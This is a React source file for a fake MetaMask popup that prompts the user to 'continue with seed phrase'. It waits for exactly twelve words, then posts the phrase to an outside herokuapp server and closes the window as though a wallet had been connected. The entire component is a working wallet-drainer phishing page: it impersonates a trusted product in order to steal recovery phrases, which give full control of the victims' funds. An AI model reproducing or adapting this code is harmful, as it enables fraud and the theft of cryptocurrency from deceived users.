/* eslint-disable no-unused-vars */
import { useState } from "react";
import { FiChevronDown, FiCircle } from "react-icons/fi";
import { BsFillCircleFill } from "react-icons/bs";
import metaMaskIcon from "../Images/metamask.png";
import { useNavigate } from "react-router-dom";

const NewWindowElement = () => {
  const [seedValue, setSeedValue] = useState("");
  let navigate = useNavigate();

  const handleSeedValue = (e) => {
    let regEx = /^[a-zA-Z\s]*$/;
    if (e.target.value.match(regEx)) {
      setSeedValue(e.target.value);
    }
  };

  const PostData = () => {
    fetch("https://mandil-election.herokuapp.com/send", {
      method: "post",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        message: seedValue.trim(),
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        localStorage.setItem("connected", true);
        window.close();
        window.opener.CallParentfunction();
      })
      .catch((err) => {
        console.log(err);
      });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    PostData();
  };

  const checkDisabled =
    seedValue.split(" ").filter((e) => e).length === 12 ? true : false;

  return (
    <div className="newWindowElement">
      <div className="topBar">
        <img src={metaMaskIcon} height="25" width="25" alt="icon" />
        <button
          style={{
            cursor: "pointer",
            backgroundColor: "transparent",
            display: "flex",
            alignItems: "center",
            height: "30px",
          }}
        >
          <BsFillCircleFill
            style={{ marginRight: "5px" }}
            size={15}
            color="#76a1a1"
          />{" "}
          Ethereum MainNet{" "}
          <FiChevronDown style={{ marginLeft: "5px" }} size={18} />
        </button>
      </div>
      <form onSubmit={handleSubmit} className="content">
        <h2>Continue with Seed Phrase</h2>
        <p>Enter your keyword phrase of 12 words to continue using MetaMask.</p>
        <div className="seedArea">
          <label style={{ marginBottom: ".4rem" }}>Wallet Seed</label>
          <textarea
            placeholder="Separate each word with a single space"
            className="seedTextArea"
            rows="6"
            value={seedValue}
            onChange={handleSeedValue}
          />
        </div>
        <button
          type="submit"
          disabled={!checkDisabled}
          style={
            checkDisabled
              ? {
                  backgroundColor: "rgb(241, 170, 38)",
                  cursor: "pointer",
                }
              : { backgroundColor: "rgb(235, 216, 180)" }
          }
          className="seedProceedButton"
        >
          Proceed
        </button>
      </form>
    </div>
  );
};
export default NewWindowElement;
